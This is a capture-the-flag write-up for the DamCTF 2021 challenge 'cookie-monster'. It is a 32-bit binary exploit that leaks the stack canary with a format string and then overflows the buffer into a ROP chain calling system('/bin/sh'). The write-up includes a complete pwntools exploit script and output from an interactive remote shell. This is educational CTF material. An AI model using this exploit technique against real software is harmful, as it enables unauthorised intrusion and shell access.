# DamCTF 2021 

## pwn/cookie-monster

> Do you like cookies? I like cookies.
> 
> `nc chals.damctf.xyz 31312`
>
> Author: BobbySinclusto
> 
> [`cookie-monster`](cookie-monster)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_ _stack-canary_ _format-string_ _rop_


## Summary

Leak stack canary with format string to enable buffer overflow and ROP FTW.

**UPDATE: Added detail on how to compute the location of the canary.**


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

No PIE, Partical RELRO = Easy ROP, easy GOT overwrite.  x86 (32-bit) makes for even easier ROP (all args passed on stack).


### Decompile with Ghidra    

```c
void bakery(void)
{
  int in_GS_OFFSET;
  char local_30 [32];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Enter your name: ");
  fgets(local_30,0x20,stdin);
  printf("Hello ");
  printf(local_30);
  puts("Welcome to the bakery!\n\nCurrent menu:");
  system("cat cookies.txt");
  puts("\nWhat would you like to purchase?");
  fgets(local_30,0x40,stdin);
  puts("Have a nice day!");
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

A couple of vulns here; first there's `printf(local_30)` (no format string), we'll use this to leak the canary, and second there's `fgets(local_30,0x40,stdin)`, where `fgets` is reading in up to `0x40` bytes into a buffer that is `0x30` (`local_30`) bytes from the return address on the stack.  IOW, we have 16 bytes (15 really since fgets will replace the last byte with null) to write out a ROP chain.

If you check the binary there's some freebies in there to make this a lot easier.  First `system` is in the GOT, so we do not need to leak libc, and second `strings cookie-monster | grep bin/sh` returns, well, `/bin/sh`.

We'll only need 12 bytes for a ROP chain.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./cookie-monster')

if args.REMOTE:
    p = remote('chals.damctf.xyz', 31312)
else:
    p = process(binary.path)

p.sendlineafter(b': ',b'%15$p')
p.recvuntil('Hello ')
canary = int(p.recvline().strip(),16)
log.info('canary: ' + hex(canary))

payload  = b''
payload += (0x30 - 0x10) * b'A'
payload += p32(canary)
payload += (0x30 - len(payload)) * b'B'
payload += p32(binary.plt.system)
payload += p32(0)
payload += p32(binary.search(b"/bin/sh").__next__())

p.sendlineafter(b'?\n',payload)
p.interactive()
```

To leak the canary use the format string `%15$p`.

_Why `%15$p`?_

This can be easily computed once you know the offset.  Just add `(0x30 - 0x10) / 4` to the offset.

From the decompile output above `local_30` (buffer) is `0x30` bytes from the base of the stack frame, and `local_10` (canary) is `0x10` bytes from the base of the stack frame (these are Ghidra conventions).  `(0x30 - 0x10)` is the distance from the start of the buffer to the canary.  `/4` computes the number of stack lines for x86 (32-bit).

To get the [buffer] offset, send `%xx%p` where `xx` is `01`, `02`, ... until you get a match, once there's a match, then you have the offset, e.g.:

```bash
# ./cookie-monster
Enter your name: %6$p
Hello 0xff938f78
```

Not a match.

```bash
# ./cookie-monster
Enter your name: %7$p
Hello 0x70243725
```

`0x70243725` is little endian ASCII hex for `%7$p`, a match, therefore the offset is 7.

`7 + (0x30 - 0x10) / 4 = 15`

With canary in hand, constructing the 32-bit ROP chain is just:

```
location of system
return address (we do not plan on returning here, so any value is fine)
first arg to system (location of string /bin/sh)
```


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/damctf2021/cookie-monster/cookie-monster'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chals.damctf.xyz on port 31312: Done
[*] canary: 0xb063cf00
[*] Switching to interactive mode
Have a nice day!
$ cat flag
dam{s74CK_c00k13S_4r3_d3L1C10Us}
```
